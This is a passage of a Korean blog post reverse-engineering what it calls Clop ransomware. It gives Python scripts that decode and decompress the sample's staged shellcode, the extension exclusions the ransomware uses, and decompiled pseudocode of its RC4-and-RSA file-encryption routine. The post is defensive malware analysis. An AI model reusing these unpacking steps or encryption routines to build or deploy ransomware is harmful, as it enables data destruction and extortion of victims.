class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1380</span>): </span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x4559</span> ^ ROL4(<span class="number">0x4559</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,shellcode[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decode)</span><br></pre></td></tr></table></figure>



<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><img src="https://user-images.githubusercontent.com/49066484/119485756-68705800-bd92-11eb-8017-231cc6686fbf.png" alt="그림5"></p>
<p>Step 1에서 추출한 Shellcode를 IDA로 확인한 모습니다. TerminateThread, Virtual..와 같은 문자열이 있는걸 확인할 수 있고 이는 성공적으로 두번째 단계에 들어왔음을 의미한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119485758-69a18500-bd92-11eb-9a72-f491f7abf3db.png" alt="그림6"></p>
<p>Step 1에서 인자로 받아온 Kernel32와 GetProcAddress를 통해 필요한 함수 주소를 알아온다. 성공적으로 모든 함수의 주소를 알아 왔다면 VirtualQuery 함수를 호출한다. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/119487256-1b8d8100-bd94-11eb-926a-0b90e4076009.png" alt="그림7"></p>
<p>VirtualQuery함수는 프로세스의 특정 메모리의 정보, 권한을 얻어온다. 여기서 <code>lpAddress</code>의 인자 값으로 <code>retaddr</code>이 들어갔는데 이 주소는 Step 1에서 Shellcode 호출 후 다음으로 실행될 주소이다. 이는 이전 Step 의 바이너리의 ImageBase주소의 정보를 얻기 위함으로 예상된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119488156-30b6df80-bd95-11eb-9bae-185f1498de93.png" alt="그림8"></p>
<p><code>Line265 269</code>에서 args[2],args[4]만큼의 크기를 VirtualAlloc한다. 여기서 args는 Step 1에서 Shellcode를 호출 할 때의 인자값들로 아래 그림을 참고하면 args[2]는 3번째 인자인 <code>0x19d48</code> args[4]는 5번째 인자인 <code>0x20200</code>임을 알 수 있다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119489985-3f05fb00-bd97-11eb-9792-167a31b8725a.png" alt="그림9"></p>
<p><img src="https://user-images.githubusercontent.com/49066484/119489986-3f9e9180-bd97-11eb-89be-7d335f941ab5.png" alt="그림10"></p>
<p>각각 크기로 VirtualAlloc을 한 후, 반복문을 통해 <code>0x19d48</code>만큼 할당한 메모리에 값을 쓴다. 이 과정에서는 Step 1에서 Shellcode를 추출할 때 보였던 코드가 있으며, 이는 다음 단계로 넘어가는 Shellcode를 추출하는 것임을 다시 한 번 예상할 수 있다. Shellcode를 추출 한 후   <code>aplib_decompress</code>을 호출한다. 이때 인자는 <code>0x19d48</code>만큼 할당한 메모리와 <code>0x20200</code>만큼 할당한 메모리가 되는데 추출 한 Shellcode를 decompress하여 해당 내용을 더 큰 메모리에 쓰는 역할을 한다. </p>
<p>다음 단계로 넘어가기 위해 Step 1과 동일하게 해당 코드를 python으로 구현하였고, 이 때 decompress하는 과정은 아래 모듈을 사용했다.</p>
<ul>
<li><a href="https://github.com/snemes/aplib/blob/master/aplib.py">https://github.com/snemes/aplib/blob/master/aplib.py</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;APLib&#x27;</span>, <span class="string">&#x27;decompress&#x27;</span>]</span><br><span class="line">__version__ = <span class="string">&#x27;0.6&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Sandor Nemes&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APLib</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    __slots__ = <span class="string">&#x27;source&#x27;</span>, <span class="string">&#x27;destination&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;bitcount&#x27;</span>, <span class="string">&#x27;strict&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, source, strict=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.source = BytesIO(source)</span><br><span class="line">        self.destination = <span class="built_in">bytearray</span>()</span><br><span class="line">        self.tag = <span class="number">0</span></span><br><span class="line">        self.bitcount = <span class="number">0</span></span><br><span class="line">        self.strict = <span class="built_in">bool</span>(strict)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># check if tag is empty</span></span><br><span class="line">        self.bitcount -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.bitcount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># load next tag</span></span><br><span class="line">            self.tag = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">            self.bitcount = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># shift bit out of tag</span></span><br><span class="line">        bit = self.tag &gt;&gt; <span class="number">7</span> &amp; <span class="number">1</span></span><br><span class="line">        self.tag &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bit</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getgamma</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># input gamma2-encoded bits</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.getbit():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">depack</span>(<span class="params">self</span>):</span></span><br><span class="line">        r0 = -<span class="number">1</span></span><br><span class="line">        lwm = <span class="number">0</span></span><br><span class="line">        done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># first byte verbatim</span></span><br><span class="line">            self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># main decompression loop</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">                <span class="keyword">if</span> self.getbit():</span><br><span class="line">                    <span class="keyword">if</span> self.getbit():</span><br><span class="line">                        <span class="keyword">if</span> self.getbit():</span><br><span class="line">                            offs = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                                offs = (offs &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.destination.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            lwm = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            offs = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = <span class="number">2</span> + (offs &amp; <span class="number">1</span>)</span><br><span class="line">                            offs &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                    self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line">                            lwm = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        offs = self.getgamma()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> lwm == <span class="number">0</span> <span class="keyword">and</span> offs == <span class="number">2</span>:</span><br><span class="line">                            offs = r0</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> lwm == <span class="number">0</span>:</span><br><span class="line">                                offs -= <span class="number">3</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                offs -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            offs &lt;&lt;= <span class="number">8</span></span><br><span class="line">                            offs += <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">32000</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">1280</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &lt; <span class="number">128</span>:</span><br><span class="line">                                length += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line"></span><br><span class="line">                        lwm = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line">                    lwm = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> (TypeError, IndexError):</span><br><span class="line">            <span class="keyword">if</span> self.strict:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;aPLib decompression error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(self.destination)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">data, strict=<span class="literal">False</span></span>):</span></span><br><span class="line">    packed_size = <span class="literal">None</span></span><br><span class="line">    packed_crc = <span class="literal">None</span></span><br><span class="line">    orig_size = <span class="literal">None</span></span><br><span class="line">    orig_crc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;AP32&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(data) &gt;= <span class="number">24</span>:</span><br><span class="line">        <span class="comment"># data has an aPLib header</span></span><br><span class="line">        header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(<span class="string">&#x27;=IIIII&#x27;</span>, data, <span class="number">4</span>)</span><br><span class="line">        data = data[header_size : header_size + packed_size]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> packed_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_size != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> packed_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_crc != crc32(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = APLib(data, strict=strict).depack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> orig_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_size != <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> orig_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_crc != crc32(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># self-test</span></span><br><span class="line">    data = <span class="string">b&#x27;T\x00he quick\xecb\x0erown\xcef\xaex\x80jumps\xed\xe4veur`t?lazy\xead\xfeg\xc0\x00&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> decompress(data) == <span class="string">b&#x27;The quick brown fox jumps over the lazy dog&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clop&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xA8D0</span>)</span><br><span class="line">    data = f.read(<span class="number">0x19d48</span>)</span><br><span class="line">     </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">0x19d48</span>:</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        i = i + <span class="number">2</span></span><br><span class="line">    result += data[i].to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result ) // <span class="number">4</span>):</span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x0AE0</span> ^ ROL4(<span class="number">0x0AE0</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,result[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decompress&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompress(decode))</span><br></pre></td></tr></table></figure>


<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><img src="https://user-images.githubusercontent.com/49066484/119491533-fe0ee600-bd98-11eb-8fec-6f0deddb3060.png" alt="그림11"></p>
<p>세 번째 단계로 들어왔다. 여기에는 악성코드에서 쓰일법한 함수들이 많이 있는 것으로 보아 실제 악성 행위를 하는 코드가 있을 것이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119492069-9e650a80-bd99-11eb-8f75-b1a39506e900.png" alt="그림12"></p>
<p>특정 조건을 만족하면 CreateThread함수를 호출한다. 이 때 Thread가 수행하는 함수는 악성 행위를 할 가능성이 높다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602027-4542b880-be25-11eb-8f55-fdbe8ea87f94.png" alt="그림15"></p>
<p><code>WNetOpenEum</code>,<code>WNetEenumResource</code>함수 호출로 현재 연결되어있는 네트워크 정보를 알아온다. 그리고 특정 조건이 만족되면 다시 한 번 CreateThread함수를 호출한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602538-517b4580-be26-11eb-9501-16d51b87e141.png" alt="그림16"></p>
<p><code>Crypt</code>로 시작하는 함수들이 보인다. 암호화 관련 코드인 것 같다.  pubKey 문자열을 복사하는데 해당 내용은 아래와 같다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119602903-234a3580-be27-11eb-9b70-5a859c8e043b.png" alt="그림17"></p>
<ul>
<li>CryptStringToBinaryA : 포맷된 문자열을 바이트 배열로 변환</li>
<li>CryptDecodeObjectEx : 변환된 바이트 배열을 구조체 변수로 디코딩</li>
<li>CryptAcquireContextW :  특정 cryptographic service provider(CSP)에서 원하는 키 컨테이너의 핸들값을 가져옴</li>
<li>CryptImportPublicKeyInfo : pubkey의 핸들값을 가져옴</li>
</ul>
<p>위에서 얻은 Key, 구조체, 핸들 값을 가지고 <code>4014b0()</code>을 호출한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119604958-eaac5b00-be2a-11eb-9b28-20f86fc67822.png" alt="그림18"></p>
<p><code>4014b0()</code>에서는 암호화할 path를 확인한다. 조건문에서 <code>compare_hash_file</code>의 반환 값에 따라 LABEL_37로 이동한다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119605228-5db5d180-be2b-11eb-838a-1f6ad410dbb8.png" alt="그림20"></p>
<p><code>compare_hash_file</code>함수에서는 특정 hash값과 path에 대한 hash값을 비교하여 return 값을 반환한다. 이 는 모든 Windows의 파일을 암호화하게 된다면 정상적인 작동이 어렵기에 Windows 동작에 필요한 특정 파일들을 암호화에서 제외하는 작업이다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119604955-e97b2e00-be2a-11eb-9daa-ee03a1ad117b.png" alt="그림19"></p>
<p>LABLE_37은 <code>4014b0</code>을 다시 호출하는 것을 확인 할 수 있는데 이는 해당 path의 하위 폴더를 대상으로 재귀적인 호출을 통해 암호화에서 제외하는 작업으로 판단된다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119605813-60fd8d00-be2c-11eb-8d12-0acaac89757a.png" alt="그림21"></p>
<p>그러고 나서 조건문을 만나는데, 파일 속성이 디렉토리가 아닐 경우, 파일이름이 <code>..</code> , <code>.</code> 가 아닐 경우, 파일 이름이 <code>README_README.txt</code>가 아닐 경우와 추가적으로</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119606160-01ec4800-be2d-11eb-8c41-ee6a79062579.png" alt="그림22"></p>
<p>특정 파일의 hash값과 일치 하지 않을 경우 (특정 파일이 아닌경우)</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119606165-0284de80-be2d-11eb-89a0-fc5b10cfe1b8.png" alt="그림23"></p>
<p>파일의 확장자가 특정 값이 아닐 경우 (특정 확장자가 아닌경우)에 조건문을 실행하게 된다.<br>여기서 제외되는 확장자는 아래와 같다.</p>
<pre><code>- .CI0P : 과거 암호화 파일 확장자
- .OCX : ActiveX 파일
- .DLL : 동적 라이브러리
- .EXE : 실행 파일
- .SYS : 드라이버 파일
- .LNK : 바로가기 파일
- .ICO : 아이콘 파일
- .INI : 설정파일
- .MSI : Installer 파일
- .CHM : 도움말 파일
- .HLF
- .LNG : 언어팩 파일
- .TTF : 폰트 파일
- .CMD : 배치 파일
- .BAT : 배치 파일
- .CLLP : 현재 랜섬웨어 암호화 파일
</code></pre>
<p><img src="https://user-images.githubusercontent.com/49066484/119606505-abcbd480-be2d-11eb-8b1d-0f1463e21523.png" alt="그림24"></p>
<p>조건을 만족하게 되면 앞에서 받아온 암호화 관련 key, 구조체, 핸들값들을 구조체로 만들고 CreateThread를 호출한다. 이 구조체는 CreateThread의 실행 함수의 인자로 쓰이며 해당 함수는 <code>파일을 암호화하는 함수</code>이다.</p>
<p>파일을 암호화 할 때 파일 크기가 17000보다 작으면, 암호화를 진행하지 않는다.</p>
<p>파일 크기가 17000보다 크다면,  파일 크기에 따라 두 가지 방법으로 나뉜다. </p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( args-&gt;fileSize &gt; <span class="number">2132432</span> )             <span class="comment">// 파일 크기가 2132432보다 클 때 암호화 루틴</span></span><br><span class="line">   &#123;</span><br><span class="line">     v17 = CreateFileMappingW(v3, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">2132432u</span>, <span class="number">0</span>);</span><br><span class="line">     NumberOfBytesRead = (DWORD)v17;</span><br><span class="line">     <span class="keyword">if</span> ( !v17 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">     lpBuffer = MapViewOfFile(v17, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0x10000</span>u, <span class="number">0x1F89D0</span>u);<span class="comment">// 파일 내용을 메모리에 맵핑</span></span><br><span class="line">     <span class="keyword">if</span> ( !lpBuffer )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br></pre></td></tr></table></figure>

<p>파일 크기가 2132432보다 크면 CreateFileMapping함수를 호출하는데 이는 파일 크기가 크기 때문에 open,read,write에 대한 오버헤드 역시 커져 메모리에 맵핑 후 수정하는 방식(MMF)을 사용한 것이다.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v18 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">rc4_key = v18;</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    rc4_key[v20++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">  <span class="keyword">while</span> ( v20 &lt; <span class="number">117</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !*rc4_key &amp;&amp; !rc4_key[<span class="number">1</span>] &amp;&amp; !rc4_key[<span class="number">2</span>] &amp;&amp; !rc4_key[<span class="number">3</span>] &amp;&amp; !rc4_key[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(rc4_key, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">    v2 = v33;</span><br><span class="line">  &#125;</span><br><span class="line">  nNumberOfBytesToRead = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>sbox에서 랜덤으로 값을 가져와 rc4_key를 만든다. 만약 조건을 만족하면 고정된 key를 사용하는데 이는 악성코드 제작자가 사용하기 위한 용도일 것이다.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v21 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( WriteFile(v21, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;nNumberOfBytesToRead, <span class="number">0</span>)</span><br><span class="line">  &amp;&amp; (nNumberOfBytesToWrite = <span class="number">0</span>,</span><br><span class="line">      encrypted_key = (BYTE *)VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>),</span><br><span class="line">      v23 = v2-&gt;hKey,</span><br><span class="line">      v28 = (DWORD)encrypted_key,</span><br><span class="line">      encrypt_key(rc4_key, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v23, encrypted_key),</span><br><span class="line">      WriteFile(v21, (LPCVOID)v28, nNumberOfBytesToWrite, &amp;nNumberOfBytesToRead, <span class="number">0</span>))</span><br><span class="line">  &amp;&amp; v28 )</span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">  VirtualFree((LPVOID)v28, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>암호화에 쓰일 rc4_key를 만든 후 암호화 대상 파일의 이름과 같은 이름의 <code>.clip</code>확장자의 파일을 만든다. 그리고 <code>clip^_-</code>문자열과 rc4_key값을 encrypt_key함수를 통해 RSA로 암호화한 후 해당 파일에 적는다.  (rc4_key를 encrpyt하는 과정)</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">      CloseHandle(v21);</span><br><span class="line">    rc4_init((<span class="keyword">int</span>)rc4_key, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">    rc4_encrypt((<span class="keyword">char</span> *)lpBuffer, <span class="number">0x1F89D0</span>u, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">    UnmapViewOfFile(lpBuffer);</span><br><span class="line">    v4 = (<span class="keyword">void</span> (__stdcall *)(HANDLE))CloseHandle;</span><br><span class="line">    CloseHandle((HANDLE)lpBuffer);</span><br><span class="line">    CloseHandle((HANDLE)NumberOfBytesRead);</span><br><span class="line">    v24(rc4_key, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>만든 rc4_key를 가지고 <code>rc4_init</code>,<code>rc4_encrypt</code>함수를 호출하여 암호화 대상 파일을 암호화 한다. (파일을 encrypt하는 과정)</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;                                           <span class="comment">// 파일 크기가 2132432 보다 작거나 같을때 암호화 루틴</span></span><br><span class="line">  v6 = args-&gt;fileSize;</span><br><span class="line">  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  SetFilePointer(v3, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  nNumberOfBytesToRead = v6 - <span class="number">0x4000</span>;</span><br><span class="line">  v7 = GlobalAlloc(<span class="number">0x40</span>u, v6 - <span class="number">0x4000</span>);</span><br><span class="line">  v29 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; ReadFile(v5, v7, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure>

<p>파일 크기가 2132432보다 작으면 메모리 mapping 방식이 아닌 read,write 방식을 사용하고, 나머지 encrypt 방식은 위와 동일하다.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v8 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">  rc4_key_ = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      rc4_key_[v10++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v10 &lt; <span class="number">117</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !*rc4_key_ &amp;&amp; !rc4_key_[<span class="number">1</span>] &amp;&amp; !rc4_key_[<span class="number">2</span>] &amp;&amp; !rc4_key_[<span class="number">3</span>] &amp;&amp; !rc4_key_[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(rc4_key_, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">      v2 = v33;</span><br><span class="line">    &#125;</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    v11 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( WriteFile(v11, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span 